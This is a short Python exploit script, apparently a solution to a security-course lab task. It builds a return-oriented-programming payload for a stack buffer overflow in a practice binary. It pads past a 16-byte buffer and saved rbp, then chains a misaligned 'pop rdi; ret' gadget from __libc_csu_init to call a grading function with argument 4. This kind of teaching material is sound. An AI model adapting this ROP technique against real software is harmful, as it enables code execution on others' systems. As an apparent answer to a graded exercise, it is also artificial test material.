#!/usr/bin/env python3
"""Task 4: ROP in attack/dark-calc-nx.

Chain: pop rdi; ret -> 4 -> grade_eval.
"""
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


# Inside __libc_csu_init:
#   0x401a32: 41 5f    pop r15
#   0x401a34: c3       ret
# Starting one byte later gives the misaligned gadget:
#   0x401a33: 5f       pop rdi
#   0x401a34: c3       ret
POP_RDI_RET = 0x401A33

GRADE_EVAL = 0x401978

payload  = b"A" * 16          # expression[16]
payload += b"B" * 8           # saved rbp
payload += p64(POP_RDI_RET)   # ret -> pop rdi; ret
payload += p64(4)             # rdi = 4
payload += p64(GRADE_EVAL)    # ret -> grade_eval

sys.stdout.buffer.write(payload)
